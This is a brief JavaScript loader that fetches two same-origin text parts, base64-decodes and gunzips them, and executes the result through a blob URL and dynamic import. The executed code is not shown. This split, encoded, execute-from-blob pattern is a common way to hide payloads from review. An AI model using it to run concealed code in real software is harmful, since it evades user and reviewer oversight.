/* RevDev dual-key loader */
async function inflateBase64Gzip(b64) {
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  const ds = new DecompressionStream("gzip");
  const stream = new Blob([bytes]).stream().pipeThrough(ds);
  const buf = await new Response(stream).arrayBuffer();
  return new TextDecoder().decode(buf);
}
const PARTS = 2;
const b64parts = [];
for (let i = 0; i < PARTS; i++) {
  const res = await fetch("./dual_pl." + i + ".txt?v=1");
  if (!res.ok) throw new Error("Missing dual payload part " + i);
  b64parts.push((await res.text()).replace(/\s+/g, ""));
}
const source = await inflateBase64Gzip(b64parts.join(""));
const url = URL.createObjectURL(new Blob([source], { type: "text/javascript" }));
await import(url);
